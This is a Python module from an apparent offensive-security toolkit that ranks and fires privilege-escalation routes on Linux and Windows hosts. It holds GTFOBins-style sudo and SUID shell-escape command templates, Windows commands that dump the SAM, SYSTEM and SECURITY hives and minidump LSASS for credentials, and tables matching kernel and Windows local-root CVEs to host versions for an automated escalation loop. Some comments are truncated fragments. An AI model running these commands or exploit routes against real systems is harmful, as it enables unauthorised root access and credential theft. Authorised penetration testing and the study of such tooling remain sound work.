"""Privilege-escalation drivers — TTP-driven, all vectors flow through YAML.

The single live driver is :func:`_d_ttp_yaml`, wired via :data:`DRIVERS`
for both Linux and Windows. It loads the shipped catalog from
fieldkit/ttps/*.yaml, walks each TTP's ``detect:`` predicate against
:class:`~fieldkit.hostenum.HostFacts`, and turns matches into
:class:`Vector` objects the executor can fire.

Vectors run ``id``/``whoami`` as the elevated context so the executor
captures the identity as ground-truth proof of the escalation; a new
technique is a new YAML file, not a code change here.

The :data:`GTFO`, :data:`WIN_PRIVS`, :data:`WIN_GROUPS`, :data:`KERNEL_LPE`,
:data:`WIN_LPE` tables stay exported — they're the pure-Python coverage
lookup that reportkb + tests use to pin what the TTP catalog covers.
"""
import re
from dataclasses import dataclass

from . import kb
from .hostenum import LINUX, WINDOWS, facts_for

#: The proof command per OS: run this as the elevated context, capture the identity.

@dataclass(frozen=True)
class Playbook:
    """Operator steps for a route fieldkit *prepares* but can't safely one-shot (it would
    have to overwrite/plant into an already-running service). fieldkit builds the artifact
    and this says where to place it and what to run — see `fieldkit prep`."""

    summary: str
    place: str            # where the built artifact goes on the target
    steps: tuple          # ordered, concrete operator steps
    restore: str = None   # how to undo it afterwards


@dataclass(frozen=True)
class Vector:
    """One runnable, ranked escalation. ``command`` is the target-side proof."""

    key: str                 # unique per concrete vector, e.g. "sudo:find", "seimpersonate"
    title: str
    exploitability: str
    safety: str
    detection: str
    command: str
    shell: str               # cmd | powershell | sh — which transport shell to use
    host: str = None
    detail: str = ""
    evidence: str = ""
    safe_proof: str = None
    cleanup: str = None      # cleanup command when the vector changes state, else None
    report_type: str = ""    # the reportkb vector_type a proven finding records under
    family: str = None       # objective shared by delivery alternates (e.g. "seimpersonate")
    delivery: str = None     # the evasion.Technique key this vector's delivery presents
    #: (arsenal_name, remote_path) artifacts this vector needs on the target — the loop
    #: auto-stages these from the arsenal and retries when the target reports them missing.
    stages: tuple = ()
    #: (format, remote_path, build_command) artifacts fieldkit *builds* (see fieldkit.poc)
    #: then stages — the loop builds+pushes these on a miss, rebuilds corrected on a
    #: BAD_BUILD. ``build_command`` is what the built artifact runs (None → poc's proof).
    builds: tuple = ()
    #: arsenal artifacts to *serve over HTTP while the command runs* — the target pulls
    #: them in-memory (e.g. a PowerShell IEX download-cradle), nothing on disk. The command
    #: references the served base via the ``{url}`` placeholder. Needs a reachable lhost.
    serves: tuple = ()
    #: set when the route needs operator hands after fieldkit builds the artifact — the
    #: escalate loop won't auto-fire it; `fieldkit prep` renders the steps.
    playbook: object = None

    @property
    def manual(self):
        return self.playbook is not None

    @property
    def score(self):
        return kb.score(self.exploitability, self.safety, self.detection)

    @property
    def axes(self):
        return f"{self.exploitability}/{self.safety}/{self.detection}"

    @property
    def kind(self):
        return "vector"


@dataclass
class _Ctx:
    host: str
    stage_win: str = "C:\\Windows\\Temp"
    stage_lin: str = "/tmp"


# ------------------------------------------------------------ GTFOBins (curated)

#: {C} is replaced with the proof command. Non-interactive forms only (they must run
#: under one-shot capture); shell-escape forms are read-only — they leave nothing on
#: disk. ``safety``/``cleanup`` override where a form writes to the target.
GTFO = {
    "bash":   {"suid": "bash -p -c '{C}'",               "sudo": "sudo bash -c '{C}'"},
    "sh":     {"suid": "sh -p -c '{C}'",                 "sudo": "sudo sh -c '{C}'"},
    "dash":   {"suid": "dash -p -c '{C}'",               "sudo": "sudo dash -c '{C}'"},
    "find":   {"suid": "find . -exec {C} \\; -quit",     "sudo": "sudo find . -exec {C} \\; -quit"},
    "python": {"suid": "python -c 'import os;os.setuid(0);os.system(\"{C}\")'",
               "sudo": "sudo python -c 'import os;os.system(\"{C}\")'"},
    "perl":   {"suid": "perl -e 'use POSIX qw(setuid);POSIX::setuid(0);system(\"{C}\");'",
               "sudo": "sudo perl -e 'system(\"{C}\");'"},
    "ruby":   {"suid": "ruby -e 'Process::Sys.setuid(0);system(\"{C}\")'",
               "sudo": "sudo ruby -e 'system(\"{C}\")'"},
    "php":    {"suid": "php -r 'posix_setuid(0);system(\"{C}\");'",
               "sudo": "sudo php -r 'system(\"{C}\");'"},
    "node":   {"sudo": "sudo node -e 'require(\"child_process\").execSync(\"{C}\",{stdio:[0,1,2]})'"},
    "awk":    {"suid": "awk 'BEGIN{system(\"{C}\")}'",   "sudo": "sudo awk 'BEGIN{system(\"{C}\")}'"},
    "gawk":   {"suid": "gawk 'BEGIN{system(\"{C}\")}'",  "sudo": "sudo gawk 'BEGIN{system(\"{C}\")}'"},
    "env":    {"suid": "env {C}",                        "sudo": "sudo env {C}"},
    "tar":    {"suid": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='{C}'",
               "sudo": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec={C}"},
    "gdb":    {"suid": "gdb -nx -batch -ex 'python import os;os.setuid(0)' -ex '!{C}'",
               "sudo": "sudo gdb -nx -batch -ex '!{C}'"},
    "make":   {"suid": "make -s --eval=$'x:\\n\\t-{C}'", "sudo": "sudo make -s --eval=$'x:\\n\\t-{C}'"},
    "docker": {"suid": "docker run -v /:/mnt --rm alpine chroot /mnt {C}",
               "sudo": "sudo docker run -v /:/mnt --rm alpine chroot /mnt {C}"},
    "nmap":   {"sudo": "echo 'os.execute(\"{C}\")' > /tmp/.f.nse && sudo nmap --script=/tmp/.f.nse",
               "safety": "config-change", "cleanup": "rm -f /tmp/.f.nse"},
}


def _canon(basename):
    """Strip a trailing version so ``python3.8`` matches the ``python`` table key."""
    return re.sub(r"[0-9.]+$", "", basename) or basename




#: is required (see SUPPLIED-BINARIES.md); the command references the staging dir.
WIN_PRIVS = {
    "SeBackupPrivilege": dict(
        report_type="sebackup", key="sebackup", title="SeBackup → dump the SAM/SYSTEM hives",
        exploitability="high", safety="config-change", detection="moderate",
        command='reg save HKLM\\SAM {stage}\\sam & reg save HKLM\\SYSTEM {stage}\\sys & '
                'reg save HKLM\\SECURITY {stage}\\sec',
        cleanup="del {stage}\\sam {stage}\\sys {stage}\\sec",
        detail="read the hives, then secretsdump offline for local hashes.",
        safe_proof="the reg-save succeeding proves the read primitive; delete the hives after."),
    "SeDebugPrivilege": dict(
        report_type="lsass", key="sedebug", title="SeDebug → dump LSASS",
        exploitability="high", safety="config-change", detection="loud",
        command='powershell -c "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump '
                '(Get-Process lsass).Id {stage}\\l.dmp full"',
        cleanup="del {stage}\\l.dmp", shell="powershell",
        detail="minidump LSASS, then pypykatz/mimikatz offline for logged-on creds.",
        safe_proof="a successful dump proves it; the .dmp is loot — pull and delete it."),
    "SeLoadDriverPrivilege": dict(
        report_type="seloaddriver", key="seloaddriver", title="SeLoadDriver → BYOVD kernel r/w → SYSTEM",
        exploitability="high", safety="crash-risk", detection="loud",
        needs="a known-vulnerable signed driver staged in {stage}",
        command='echo BYOVD chain is driver-specific — stage the driver + its loader',
        detail="load a vulnerable signed driver for kernel r/w; loud and can BSOD."),
    "SeTakeOwnershipPrivilege": dict(
        report_type="setakeownership", key="setakeownership", title="SeTakeOwnership → own a SYSTEM file → SYSTEM",
        exploitability="medium", safety="config-change", detection="moderate",
        command='takeown /f C:\\Windows\\System32\\<target> && icacls C:\\Windows\\System32\\<target> /grant %USERNAME%:F',
        detail="take ownership of a SYSTEM-owned service exe/DLL, rewrite its ACL, replace it."),
    "SeManageVolumePrivilege": dict(
        report_type="semanagevolume", key="semanagevolume", title="SeManageVolume → arbitrary write → SYSTEM",
        exploitability="medium", safety="config-change", detection="moderate",
        command='echo SeManageVolume2System: obtain full C:\\ write, then plant a DLL a SYSTEM service loads',
        detail="turns into an arbitrary-file-write primitive; plant a DLL on a service's search path."),
}

#: group membership that is itself a route, independent of held privileges.
WIN_GROUPS = {
    "Backup Operators": dict(
        report_type="sebackup", key="sebackup", title="Backup Operators → dump the SAM/SYSTEM hives",
        exploitability="high", safety="config-change", detection="moderate",
        command='reg save HKLM\\SAM {stage}\\sam & reg save HKLM\\SYSTEM {stage}\\sys',
        cleanup="del {stage}\\sam {stage}\\sys",
        detail="the group grants SeBackup in practice — read the hives, dump offline."),
}


#: The impersonation objective (SeImpersonate / SeAssignPrimaryToken → SYSTEM) is one
#: goal reached by several tools whose *delivery methods* differ — so it is a delivery
#: ladder, not one vector. The orchestrator fires them in evasion-posture order and, when
#: one is caught, climbs to the next method (native PE on disk → fileless in-memory →
#: PowerShell script). ``delivery`` names the :mod:`fieldkit.evasion` technique each
#: presents; a live catch marks that technique red so the loop won't re-burn it.

#: (key, cve, artifact, component, lo, hi, exploitability, safety, detection, title, note)
KERNEL_LPE = (
    dict(key="pwnkit", cve="CVE-2021-4034", artifact="pwnkit", component="polkit",
         lo=None, hi=None, needs_suid="pkexec",
         exploitability="high", safety="config-change", detection="moderate",
         title="pkexec PwnKit → root",
         note="pkexec is SUID-root and PwnKit needs no exotic preconditions — the most "
              "reliable Linux local root of the set. polkit fixes are backported without a "
              "version bump, so confirm the distro patch level rather than the version alone."),
    dict(key="baronsamedit", cve="CVE-2021-3156", artifact="baronsamedit", component="sudo",
         lo="1.8.2", hi="1.9.5p1",
         exploitability="medium", safety="config-change", detection="moderate",
         title="sudo heap overflow (Baron Samedit) → root",
         note="sudoedit -s heap overflow. Reliable only with the right libc offsets for the "
              "target distro — a wrong offset crashes sudo (harmless), not the host."),
    dict(key="looneytunables", cve="CVE-2023-4911", artifact="looneytunables",
         component="glibc", lo="2.34", hi="2.37",
         exploitability="medium", safety="config-change", detection="moderate",
         title="glibc GLIBC_TUNABLES buffer overflow → root",
         note="ld.so tunables overflow. Distro backports patch 2.34–2.37 in place, so "
              "confirm the package patch level."),
    dict(key="dirtypipe", cve="CVE-2022-0847", artifact="dirtypipe", component="kernel",
         lo="5.8", hi="5.16.11",
         exploitability="high", safety="config-change", detection="moderate",
         title="Dirty Pipe (page-cache overwrite) → root",
         note="Overwrites read-only file content via the page cache — no memory corruption, "
              "so it does not panic the box. Backport fixes land in 5.15.25 / 5.10.102: an "
              "in-range version is not proof the host is unpatched."),
    dict(key="nftables", cve="CVE-2024-1086", artifact="nftables", component="kernel",
         lo="3.15", hi="6.8",
         exploitability="medium", safety="crash-risk", detection="moderate",
         title="nf_tables double-free → root",
         note="Needs unprivileged user namespaces enabled "
              "(`sysctl kernel.unprivileged_userns_clone`). Kernel heap corruption — a "
              "failed attempt can panic the host."),
    dict(key="stackrot", cve="CVE-2023-3269", artifact="stackrot", component="kernel",
         lo="6.1", hi="6.4",
         exploitability="medium", safety="crash-risk", detection="moderate",
         title="StackRot (maple tree) → root",
         note="Kernel stack expansion UAF. Narrow version window; can panic the host."),
    dict(key="cve-2021-22555", cve="CVE-2021-22555", artifact="cve-2021-22555",
         component="kernel", lo="2.6.19", hi="5.12",
         exploitability="medium", safety="crash-risk", detection="moderate",
         title="netfilter xt_compat heap OOB → root",
         note="Lives under pocs/linux/cve-2021-22555 in the google/security-research clone. "
              "Kernel heap corruption — can panic the host."),
    dict(key="dirtycow", cve="CVE-2016-5195", artifact="dirtycow", component="kernel",
         lo=None, hi="4.8.2",
         exploitability="medium", safety="crash-risk", detection="moderate",
         title="Dirty COW → root",
         note="Legacy (<4.8.3). Known to destabilise the host and can leave it needing a "
              "reboot — last resort, and only with the client's blessing."),
)


def _vtuple(version):
    """A comparable tuple from a version string. ``1.9.5p2`` -> ``(1, 9, 5, 2)`` so a
    ``p``-suffixed sudo release orders after its base; ``5.15.0`` -> ``(5, 15, 0)``."""
    if not version:
        return None
    m = re.match(r"(\d+(?:\.\d+)*)(?:p(\d+))?", str(version).strip())
    if not m:
        return None
    parts = [int(x) for x in m.group(1).split(".")]
    parts.append(int(m.group(2)) if m.group(2) else 0)
    return tuple(parts)


def _in_range(version, lo, hi):
    """True when ``version`` is inside the inclusive ``[lo, hi]`` window (None = unbounded).
    Unparseable or absent versions never match — the matcher does not guess."""
    v = _vtuple(version)
    if v is None:
        return False

    def pad(a, b):    # compare on equal width so 5.16 vs 5.16.11 orders correctly
        n = max(len(a), len(b))
        return a + (0,) * (n - len(a)), b + (0,) * (n - len(b))

    if lo is not None:
        a, b = pad(v, _vtuple(lo))
        if a < b:
            return False
    if hi is not None:
        a, b = pad(v, _vtuple(hi))
        if a > b:
            return False
    return True


#: which HostFacts field each rule's component version comes from.
_COMPONENT_FACT = {"kernel": "kernel", "sudo": "sudo_version",
                   "polkit": "pkexec_version", "glibc": "glibc_version"}


def kernel_candidates(facts):
    """The :data:`KERNEL_LPE` rules whose preconditions the facts satisfy, with the reason.

    Yields ``(rule, evidence)``. Pure and inspectable — the same ruleset drives `analyze`,
    `escalate` (as a prepared route) and the tests.
    """
    for rule in KERNEL_LPE:
        suid = rule.get("needs_suid")
        if suid:
            if suid not in facts.suid:      # facts.suid holds basenames
                continue
            yield rule, f"SUID {suid} present"
            continue
        got = getattr(facts, _COMPONENT_FACT[rule["component"]], None)
        if not _in_range(got, rule["lo"], rule["hi"]):
            continue
        window = f"{rule['lo'] or '*'}–{rule['hi'] or '*'}"
        yield rule, f"{rule['component']} {got} in {window}"


#:  detection, title, note)
WIN_LPE = (
    dict(key="printnightmare", cve="CVE-2021-34527", artifact="printnightmare",
         build_lo="10.0.0.0", build_hi="10.0.19043.9999",
         fixed_kbs=("KB5005010", "KB5005033", "KB5005565", "KB5005568", "KB5005566"),
         exploitability="high", safety="config-change", detection="loud",
         title="Print Spooler RCE (PrintNightmare) → SYSTEM",
         note="Invoke-Nightmare.ps1 is a READY PowerShell PoC (arsenal: win-kernel/"
              "printnightmare, no build). Needs Print Spooler enabled and the pre-patch "
              "state — the July 2021 out-of-band KB series fixes it."),
    dict(key="spoolfool", cve="CVE-2022-21999", artifact="SpoolFool",
         build_lo="10.0.0.0", build_hi="10.0.19045.9999",
         fixed_kbs=("KB5010342", "KB5010354", "KB5010351"),
         exploitability="high", safety="config-change", detection="moderate",
         title="Spooler service directory abuse (SpoolFool) → SYSTEM",
         note="Follow-on to PrintNightmare — abuses SpoolDirectory in the printer "
              "config. February 2022 Patch Tuesday and later KBs fix it."),
    dict(key="smbghost-2020-0796", cve="CVE-2020-0796", artifact="smbghost-2020-0796",
         build_lo="10.0.18362.0", build_hi="10.0.18363.9999",
         fixed_kbs=("KB4551762",),
         exploitability="medium", safety="crash-risk", detection="loud",
         title="SMBv3 compression overflow (SMBGhost) local LPE → SYSTEM",
         note="Only affects Windows 10 1903 and 1909 (build 18362 / 18363). Kernel "
              "corruption — a failed attempt CAN BSOD. There's a READY static .exe in "
              "the arsenal (win-kernel/smbghost-2020-0796) — no build needed."),
    dict(key="afd-2023-21768", cve="CVE-2023-21768", artifact="afd-2023-21768",
         build_lo="10.0.22000.0", build_hi="10.0.22623.9999",
         fixed_kbs=("KB5022303", "KB5022287", "KB5022834", "KB5022836"),
         exploitability="high", safety="crash-risk", detection="moderate",
         title="afd.sys AFDGetCcAsyncKey LPE → SYSTEM",
         note="Windows 11 21H2 / 22H2 and Server 2022. Kernel r/w primitive; failed "
              "exploitation can BSOD. January 2023 Patch Tuesday fixes."),
    dict(key="win32k-2021-1732", cve="CVE-2021-1732", artifact="win32k-2021-1732",
         build_lo="10.0.19041.0", build_hi="10.0.19042.9999",
         fixed_kbs=("KB4601319", "KB4601315"),
         exploitability="high", safety="crash-risk", detection="loud",
         title="win32k NtUserCreateWindowEx type confusion → SYSTEM",
         note="Windows 10 2004 / 20H2. Bitmap type-confusion kernel corruption; can "
              "BSOD. Patched by February 2021 Cumulative."),
)


def _build_tuple(build):
    """(10, 0, 19045, 0) etc. Right-pads to a fixed length so comparisons are total."""
    if not build:
        return None
    parts = build.split(".")
    try:
        vals = [int(p) for p in parts]
    except ValueError:
        return None
    while len(vals) < 4:
        vals.append(0)
    return tuple(vals[:4])


def _build_in_range(build, lo, hi):
    v = _build_tuple(build)
    if v is None:
        return False
    if lo and v < _build_tuple(lo):
        return False
    if hi and v > _build_tuple(hi):
        return False
    return True


def win_lpe_candidates(facts):
    """The :data:`WIN_LPE` rules the facts justify. Yields ``(rule, evidence)``.

    A rule fires when the OS build is in-range AND none of its fixing KBs are
    installed. An unknown build never matches (the matcher does not guess).
    """
    for rule in WIN_LPE:
        if not _build_in_range(facts.win_build, rule["build_lo"], rule["build_hi"]):
            continue
        installed_fix = set(rule["fixed_kbs"]) & set(facts.hotfixes)
        if installed_fix:
            continue                                    # target has the fix — skip
        why = f"build {facts.win_build} in {rule['build_lo']}–{rule['build_hi']}"
        if not facts.hotfixes:
            why += " (no hotfix list captured — build match only)"
        yield rule, why







def _slug(name):
    return re.sub(r"[^A-Za-z0-9]", "_", name)




def _d_ttp_yaml(facts, ctx):
    """Load and yield vectors from every fieldkit-TTP YAML that applies to
    these facts. TTPs are loaded once per process and cached; the library is
    small enough that eager loading is fine, and file-system latency at engine
    boot beats a cache miss during an escalate loop.

    Uses :func:`ttp_to_vectors` (plural) so per-item iterable predicates —
    the Windows service-abuse quartet — can emit one Vector per matching
    service from a single YAML.
    """
    from .ttps.adapter import ttp_to_vectors
    for ttp in _cached_ttps():
        for vector in ttp_to_vectors(ttp, facts, ctx):
            yield vector


_TTP_CACHE = None


def _cached_ttps():
    """Return the loaded TTP library, loading on first call. Any LoaderError
    surfaces at first-use rather than at import — the engine still boots on
    a broken TTP file, but analyze reports the file + field via stderr."""
    global _TTP_CACHE
    if _TTP_CACHE is None:
        try:
            from .ttps import load_all
            _TTP_CACHE = load_all()
        except Exception as exc:  # noqa: BLE001 — report and continue with an empty library
            import sys
            print(f"fieldkit: warning — could not load TTP library: {exc}",
                  file=sys.stderr)
            _TTP_CACHE = ()
    return _TTP_CACHE


def _reset_ttp_cache_for_tests():
    """Test-only: clear the cache so a test can inject a specific TTP set via
    a temp directory. Not part of the public API."""
    global _TTP_CACHE
    _TTP_CACHE = None


#: OS -> the drivers that apply. Both platforms now flow through
#: ``_d_ttp_yaml`` exclusively — every privesc vector fieldkit emits
#: comes from a YAML TTP under fieldkit/ttps/. The historical Phase-B
#: port arc (sudo/caps/suid/kernel/win-lpe/win-privs/win-services
#: /AIE) retired every inlined driver in favor of that YAML+adapter
#: path; the :data:`GTFO`, :data:`WIN_PRIVS`, :data:`WIN_GROUPS`,
#: :data:`KERNEL_LPE`, :data:`WIN_LPE` tables stay exported for the
#: reportkb tests + :func:`kernel_candidates` /
#: :func:`win_lpe_candidates` which pin port coverage.
DRIVERS = {
    LINUX: (_d_ttp_yaml,),
    WINDOWS: (_d_ttp_yaml,),
}


def vectors_for(facts, host_ip, *, stage_win=None, stage_lin=None):
    """Every escalation vector the facts justify on one host, best-ranked first.

    Vectors are deduped by ``key`` in driver order — the first driver to yield
    a given key wins. Because `_d_ttp_yaml` runs first, a TTP-defined vector
    supersedes the inlined driver for the same binary; the inlined driver still
    handles binaries not yet ported.
    """
    ctx = _Ctx(host=host_ip,
               stage_win=stage_win or "C:\\Windows\\Temp",
               stage_lin=stage_lin or "/tmp")
    vectors = []
    seen_keys = set()
    for driver in DRIVERS.get(facts.os, ()):
        for vector in driver(facts, ctx):
            if vector.key in seen_keys:
                continue
            seen_keys.add(vector.key)
            vectors.append(vector)
    vectors.sort(key=lambda v: (-v.score, v.key))
    return vectors


def vectors_from_state(store, *, stage_win=None, stage_lin=None):
    """Every privesc vector across every enumerated host, best-ranked first."""
    out = []
    for host in store.hosts():
        facts = facts_for(store, host["id"])
        out.extend(vectors_for(facts, host["ip"], stage_win=stage_win, stage_lin=stage_lin))
    out.sort(key=lambda v: (-v.score, v.host or "", v.key))
    return out


def find_vector(store, host_ip, key, *, stage_win=None, stage_lin=None):
    """The vector with ``key`` on ``host_ip`` from current enum facts, or None."""
    host = store.host_by_ip(host_ip)
    if host is None:
        return None
    facts = facts_for(store, host["id"])
    for vector in vectors_for(facts, host_ip, stage_win=stage_win, stage_lin=stage_lin):
        if vector.key == key:
            return vector
    return None
